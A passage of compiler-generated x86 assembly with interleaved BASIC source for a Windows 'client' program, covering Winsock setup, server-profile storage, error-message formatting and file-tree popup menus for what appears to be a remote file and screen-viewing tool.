; .xstk2.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	_WSAStartup@8			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00A4.client			;;; i221
;
; [1440] CPrint ($$main,"* "+WSAErrorToName(WSAGetLastError()))
	call	_WSAGetLastError@0			;;; i619
	push	eax			;;; i667a
	call	func44.client			;;; i619
	mov	ebx,addr @_string.032A.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1441] WSACleanup ()
;
; [0] EXTERNAL SFUNCTION  WSACleanup       ()
	call	_WSACleanup@0			;;; i619
;
; [1442] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2.client			;;; i258
;
; [1443] END IF
else.00A4.client:
end.if.00A4.client:
;
; [1445] 'Xio ()
;
; [1446] 'Xst()
;
; [1447] fs()
;
; [0] EXTERNAL FUNCTION fs()
	call	_fs@0			;;; i619
;
; [1448] newSProfile ()
	call	func46.client			;;; i619
;
; [1450] APPLSTATUS = $$TRUE' anything but $$TRUE == client in process of exiting.
	mov	eax,-1			;;; i659
	mov	d[%APPLSTATUS.client],eax			;;; i668
;
; [1451] #CONNECTED = $$FALSE' connect status
	mov	eax,0			;;; i659
	mov	d[%#CONNECTED.client],eax			;;; i668
;
; [1452] #authok = $$FALSE' auth to server
	mov	eax,0			;;; i659
	mov	d[%#authok.client],eax			;;; i668
;
; [1453] #streamq = 23' default jpg stream quality, higher = better.
	mov	eax,23			;;; i659
	mov	d[%#streamq.client],eax			;;; i668
;
; [1454] #streamt = 5000' time between each jpg grab.
	mov	eax,5000			;;; i659
	mov	d[%#streamt.client],eax			;;; i668
;
; [1456] #hsmSend = CreateSemaphoreA (NULL,1,1,NULL)
;
; [0] EXTERNAL FUNCTION CreateSemaphoreA (lpSemaphoreAttributes, lInitialCount, lMaximumCount, lpName)
#ifdef Initialize.NULL
#undef Initialize.NULL
#endif
#define Initialize.NULL ebp-56	; exposes local variable 'NULL'
;
	push	[ebp-56]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmSend.client],eax			;;; i668
;
; [1457] #hsmCPrint = CreateSemaphoreA (NULL,1,1,NULL)
	push	[ebp-56]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmCPrint.client],eax			;;; i668
;
; [1458] #hsmDownL = CreateSemaphoreA (NULL,1,1,NULL)
	push	[ebp-56]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmDownL.client],eax			;;; i668
;
; [1459] #hsmUpL = CreateSemaphoreA (NULL,1,1,NULL)
	push	[ebp-56]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmUpL.client],eax			;;; i668
;
; [1460] #hsmListen = CreateSemaphoreA (NULL,1,1,NULL)
	push	[ebp-56]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmListen.client],eax			;;; i668
;
; [1462] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2.client			;;; i258
;
; [1463] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.Initialize.client:  ;;; Function end label for Assembly Programmers.
end.func2.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  Initialize ()  *****
;  *****
;
; [1465] FUNCTION STRING WSAErrorToName (null)
.code
;
#ifdef WSAErrorToName.null
#undef WSAErrorToName.null
#endif
#define WSAErrorToName.null ebp+8	; exposes function argument 'null'
;
align 16
_WSAErrorToName.client@4:
;  *****
;  *****  FUNCTION  WSAErrorToName ()  *****
;  *****
func44.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody44.client:
;
; [1467] RETURN GetLastErrorStr()
	call	func43.client			;;; i619
	jmp	end.func44.client			;;; i258
;
; [1468] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.WSAErrorToName.client:  ;;; Function end label for Assembly Programmers.
end.func44.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  WSAErrorToName ()  *****
;  *****
;
; [1470] FUNCTION STRING GetLastErrorStr ()
.code
align 16
_GetLastErrorStr.client@0:
;  *****
;  *****  FUNCTION  GetLastErrorStr ()  *****
;  *****
func43.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func43.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.298:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.298			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
funcBody43.client:
;
; [1471] STRING text
#ifdef GetLastErrorStr.text
#undef GetLastErrorStr.text
#endif
#define GetLastErrorStr.text ebp-40	; exposes local variable 'text'
;
;
; [1473] x = GetLastError()
#ifdef GetLastErrorStr.x
#undef GetLastErrorStr.x
#endif
#define GetLastErrorStr.x ebp-44	; exposes local variable 'x'
;
;
; [0] EXTERNAL FUNCTION GetLastError ()
	call	_GetLastError@0			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [1474] FormatMessageA ($$FORMAT_MESSAGE_FROM_SYSTEM  | $$FORMAT_MESSAGE_ALLOCATE_BUFFER,0, x, 0,&hLocal, 0,0)
;
; [0] EXTERNAL FUNCTION FormatMessageA (dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments)
	mov	eax,4096			;;; i659
	or	eax,256			;;; i763
; .xstk43.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
#ifdef GetLastErrorStr.hLocal
#undef GetLastErrorStr.hLocal
#endif
#define GetLastErrorStr.hLocal ebp-56	; exposes local variable 'hLocal'
;
	lea	eax,[ebp-56]			;;; i642
; .xstk43.0001 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	push	0			;;; i656a
	push	[ebp-44]			;;; i674a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_FormatMessageA@28			;;; i619
;
; [1475] LocalLock(hLocal)
;
; [0] EXTERNAL FUNCTION LocalLock (hMem)
	push	[ebp-56]			;;; i674a
	call	_LocalLock@4			;;; i619
;
; [1476] text = RTRIM$(CSTRING$(hLocal))
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_rtrim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1477] LocalFree(hLocal)
;
; [0] EXTERNAL FUNCTION LocalFree (hMem)
	push	[ebp-56]			;;; i674a
	call	_LocalFree@4			;;; i619
;
; [1478] RETURN text
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func43.client			;;; i258
;
; [1479] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetLastErrorStr.client:  ;;; Function end label for Assembly Programmers.
end.func43.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func43.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func43.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetLastErrorStr ()  *****
;  *****
;
; [1481] FUNCTION setSPServer (idx,STRING server,port,STRING password,socket)
.code
;
#ifdef setSPServer.idx
#undef setSPServer.idx
#endif
#define setSPServer.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef setSPServer.server
#undef setSPServer.server
#endif
#define setSPServer.server ebp+12	; exposes function argument 'server'
;
;
#ifdef setSPServer.port
#undef setSPServer.port
#endif
#define setSPServer.port ebp+16	; exposes function argument 'port'
;
;
#ifdef setSPServer.password
#undef setSPServer.password
#endif
#define setSPServer.password ebp+20	; exposes function argument 'password'
;
;
#ifdef setSPServer.socket
#undef setSPServer.socket
#endif
#define setSPServer.socket ebp+24	; exposes function argument 'socket'
;
align 16
_setSPServer.client@20:
;  *****
;  *****  FUNCTION  setSPServer ()  *****
;  *****
func47.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody47.client:
;
; [1482] SHARED TSPROFILE sprofile[]
;
; [1485] IF idx > UBOUND(sprofile[]) THEN RETURN $$FALSE
	mov	eax,d[%%%sprofile.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.299			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.299:
	dec	eax			;;; i596
	mov	ebx,d[ebp+8]			;;; i665
	cmp	eax,ebx			;;; i684a
	jge	>> else.00A5.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func47.client			;;; i258
else.00A5.client:
end.if.00A5.client:
;
; [1486] 'IFF sprofile[idx].active THEN RETURN $$FALSE		' error flag here
;
; [1488] IF server THEN sprofile[idx].server.addressb = server
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.00A6.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00A6.client			;;; i218
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,[ebp+12]			;;; i665
	lea	edi,[eax+4]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,64			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
else.00A6.client:
end.if.00A6.client:
;
; [1489] IF port THEN sprofile[idx].server.port = port
	mov	eax,d[ebp+16]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00A7.client			;;; i221
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[ebp+16]			;;; i665
	mov	d[eax+68],ebx			;;; i13b
else.00A7.client:
end.if.00A7.client:
;
; [1490] '	IF password THEN sprofile[idx].server.password = password
;
; [1491] IF socket THEN sprofile[idx].server.socket = socket
	mov	eax,d[ebp+24]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00A8.client			;;; i221
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[ebp+24]			;;; i665
	mov	d[eax+72],ebx			;;; i13b
else.00A8.client:
end.if.00A8.client:
;
; [1493] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func47.client			;;; i258
;
; [1495] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.setSPServer.client:  ;;; Function end label for Assembly Programmers.
end.func47.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	20			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  setSPServer ()  *****
;  *****
;
; [1497] FUNCTION getSPServer (idx,STRING server,port,STRING password,socket)
.code
;
#ifdef getSPServer.idx
#undef getSPServer.idx
#endif
#define getSPServer.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef getSPServer.server
#undef getSPServer.server
#endif
#define getSPServer.server ebp+12	; exposes function argument 'server'
;
;
#ifdef getSPServer.port
#undef getSPServer.port
#endif
#define getSPServer.port ebp+16	; exposes function argument 'port'
;
;
#ifdef getSPServer.password
#undef getSPServer.password
#endif
#define getSPServer.password ebp+20	; exposes function argument 'password'
;
;
#ifdef getSPServer.socket
#undef getSPServer.socket
#endif
#define getSPServer.socket ebp+24	; exposes function argument 'socket'
;
align 16
_getSPServer.client@20:
;  *****
;  *****  FUNCTION  getSPServer ()  *****
;  *****
func48.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody48.client:
;
; [1498] SHARED TSPROFILE sprofile[]
;
; [1501] IF idx > UBOUND(sprofile[]) THEN RETURN $$FALSE
	mov	eax,d[%%%sprofile.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.302			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.302:
	dec	eax			;;; i596
	mov	ebx,d[ebp+8]			;;; i665
	cmp	eax,ebx			;;; i684a
	jge	>> else.00A9.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func48.client			;;; i258
else.00A9.client:
end.if.00A9.client:
;
; [1502] IFF sprofile[idx].active THEN RETURN $$FALSE' error flag here
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	test	eax,eax			;;; i194
	jnz	>> else.00AA.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func48.client			;;; i258
else.00AA.client:
end.if.00AA.client:
;
; [1504] server = sprofile[idx].server.addressb
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	lea	esi,[eax+4]			;;; i308
	mov	edi,64			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1505] port = sprofile[idx].server.port
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+68]			;;; i313b
	mov	d[ebp+16],eax			;;; i670
;
; [1506] '	password = sprofile[idx].server.password
;
; [1507] socket = sprofile[idx].server.socket
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+72]			;;; i313b
	mov	d[ebp+24],eax			;;; i670
;
; [1509] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func48.client			;;; i258
;
; [1511] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getSPServer.client:  ;;; Function end label for Assembly Programmers.
end.func48.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	20			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  getSPServer ()  *****
;  *****
;
; [1513] FUNCTION newSProfile ()
.code
align 16
_newSProfile.client@0:
;  *****
;  *****  FUNCTION  newSProfile ()  *****
;  *****
func46.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody46.client:
;
; [1514] SHARED TSPROFILE sprofile[]
;
; [1515] STATIC num
data section 'globals$statics'
align	4
%46%num.client:	db 4 dup ?
.code
;
; [1518] IFZ num THEN
	mov	eax,d[%46%num.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00AB.client			;;; i195
;
; [1519] DIM sprofile[1]
	sub	esp,64			;;; i430
	mov	eax,1			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%sprofile.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1049427892			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%sprofile.client],eax			;;; i668
;
; [1520] ELSE
	jmp	end.if.00AB.client			;;; i107
else.00AB.client:
;
; [1521] REDIM sprofile[num+1]
	sub	esp,64			;;; i430
	mov	eax,d[%46%num.client]			;;; i663a
	add	eax,1			;;; i775
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%sprofile.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1049427892			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_RedimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%sprofile.client],eax			;;; i668
;
; [1522] END IF
end.if.00AB.client:
;
; [1524] sprofile[num].active = $$TRUE
	mov	eax,d[%46%num.client]			;;; i663a
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,-1			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1525] INC num
	inc	d[%46%num.client]			;;; i85
;
; [1527] RETURN num-1
	mov	eax,d[%46%num.client]			;;; i663a
	sub	eax,1			;;; i791
	jmp	end.func46.client			;;; i258
;
; [1528] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.newSProfile.client:  ;;; Function end label for Assembly Programmers.
end.func46.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  newSProfile ()  *****
;  *****
;
; [1530] FUNCTION InitGUIsubsystem ()
.code
align 16
_InitGUIsubsystem.client@0:
;  *****
;  *****  FUNCTION  InitGUIsubsystem ()  *****
;  *****
func3.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody3.client:
;
; [1532] InitGui ()
	call	func7.client			;;; i619
;
; [1533] CreateWindows ()
	call	func9.client			;;; i619
;
; [1534] CreateCallbacks ()
	call	funcD.client			;;; i619
;
; [1535] MessageLoop ()
	call	funcC.client			;;; i619
;
; [1536] 'CleanUp ()
;
; [1538] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.InitGUIsubsystem.client:  ;;; Function end label for Assembly Programmers.
end.func3.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  InitGUIsubsystem ()  *****
;  *****
;
; [1540] FUNCTION  WndProc (hWnd, msg, wParam, lParam)
.code
;
#ifdef WndProc.hWnd
#undef WndProc.hWnd
#endif
#define WndProc.hWnd ebp+8	; exposes function argument 'hWnd'
;
;
#ifdef WndProc.msg
#undef WndProc.msg
#endif
#define WndProc.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef WndProc.wParam
#undef WndProc.wParam
#endif
#define WndProc.wParam ebp+16	; exposes function argument 'wParam'
;
;
#ifdef WndProc.lParam
#undef WndProc.lParam
#endif
#define WndProc.lParam ebp+20	; exposes function argument 'lParam'
;
align 16
_WndProc.client@16:
;  *****
;  *****  FUNCTION  WndProc ()  *****
;  *****
func5.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func5.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,5				;;; ..
	xor	eax,eax			;;; ...
A.319:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.319			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,48			;;; i114a
;
funcBody5.client:
;
; [1541] SHARED TabChildCon[]
data section 'globals$shared'
align	4
%%%TabChildCon.client:	db 4 dup ?
.code
;
; [1542] STATIC STRING lastcmd
data section 'globals$statics'
align	4
%5%lastcmd.client:	db 4 dup ?
.code
;
; [1543] STRING cmd,buffer
#ifdef WndProc.cmd
#undef WndProc.cmd
#endif
#define WndProc.cmd ebp-40	; exposes local variable 'cmd'
;
#ifdef WndProc.buffer
#undef WndProc.buffer
#endif
#define WndProc.buffer ebp-44	; exposes local variable 'buffer'
;
;
; [1544] SHARED STRING URLBuffer
data section 'globals$shared'
align	4
%URLBuffer.client:	db 4 dup ?
.code
;
; [1545] STATIC POINTAPI pt
data section 'globals$statics'
align	4
%5%pt.client:	db 4 dup ?
.code
;
; [1546] STATIC TRECT rc
data section 'globals$statics'
align	4
%5%rc.client:	db 4 dup ?
.code
;
; [1547] STATIC msg$
data section 'globals$statics'
align	4
%5%msg$.client:	db 4 dup ?
.code
;
; [1548] SHARED hInst
data section 'globals$shared'
align	4
%hInst.client:	db 4 dup ?
.code
;
; [1549] STATIC ENLINK en
data section 'globals$statics'
align	4
%5%en.client:	db 4 dup ?
.code
;
; [1550] 'STATIC GETTEXTEX getex
;
; [1551] STATIC TEXTRANGE txtr
data section 'globals$statics'
align	4
%5%txtr.client:	db 4 dup ?
.code
;
; [1554] ' PRINT hWnd, msg, wParam, lParam
;
; [1555] SELECT CASE msg
	mov	eax,d[ebp+12]			;;; i665
; .select5.00AC = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
;
; [1557] CASE $$WM_CREATE :
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0001.client			;;; i71
;
; [1558] #hMenuFile = CreatePopupMenu ()
;
; [0] EXTERNAL FUNCTION CreatePopupMenu ()
	call	_CreatePopupMenu@0			;;; i619
	mov	d[%#hMenuFile.client],eax			;;; i668
;
; [1559] AppendMenuA (#hMenuFile, $$MF_STRING | $$MF_DISABLED,$$TreePop_Title,&" ")
;
; [0] EXTERNAL FUNCTION AppendMenuA (hMenu, wFlags, wIDNewItem, lpNewItem)
	mov	eax,0			;;; i659
	or	eax,2			;;; i763
; .xstk5.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,addr @_string.0145.client			;;; i642
	push	eax			;;; i667a
	push	160			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1560] AppendMenuA (#hMenuFile, $$MF_STRING,$$TreePop_RemTree,&"Remove from tree")
	mov	eax,addr @_string.0360.client			;;; i642
	push	eax			;;; i667a
	push	172			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1561] AppendMenuA (#hMenuFile, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1562] AppendMenuA (#hMenuFile, $$MF_STRING,$$TreePop_DownL,&"Download file")
	mov	eax,addr @_string.0362.client			;;; i642
	push	eax			;;; i667a
	push	161			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1563] AppendMenuA (#hMenuFile, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1564] AppendMenuA (#hMenuFile, $$MF_STRING,$$TreePop_Refresh,&"Refresh")'refresh node
	mov	eax,addr @_string.0363.client			;;; i642
	push	eax			;;; i667a
	push	165			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1565] AppendMenuA (#hMenuFile, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1566] AppendMenuA (#hMenuFile, $$MF_STRING,$$TreePop_CreateD,&"New folder")
	mov	eax,addr @_string.0364.client			;;; i642
	push	eax			;;; i667a
	push	162			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1567] AppendMenuA (#hMenuFile, $$MF_STRING,$$TreePop_Rename,&"Rename file")
	mov	eax,addr @_string.0365.client			;;; i642
	push	eax			;;; i667a
	push	164			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1568] AppendMenuA (#hMenuFile, $$MF_STRING,$$TreePop_DelFile,&"Delete file")
	mov	eax,addr @_string.0366.client			;;; i642
	push	eax			;;; i667a
	push	163			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1569] AppendMenuA (#hMenuFile, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1570] AppendMenuA (#hMenuFile, $$MF_STRING,$$TreePop_Prop,&"Properties")
	mov	eax,addr @_string.0367.client			;;; i642
	push	eax			;;; i667a
	push	175			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFile.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1572] #hMenuFolder = CreatePopupMenu ()
	call	_CreatePopupMenu@0			;;; i619
	mov	d[%#hMenuFolder.client],eax			;;; i668
;
; [1573] AppendMenuA (#hMenuFolder, $$MF_STRING | $$MF_DISABLED,$$TreePop_DTitle,&" ")
	mov	eax,0			;;; i659
	or	eax,2			;;; i763
	mov	d[ebp-56],eax			;;; i670
	mov	eax,addr @_string.0145.client			;;; i642
	push	eax			;;; i667a
	push	170			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1574] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_RemTree,&"Remove from tree")
	mov	eax,addr @_string.0360.client			;;; i642
	push	eax			;;; i667a
	push	172			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1575] AppendMenuA (#hMenuFolder, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
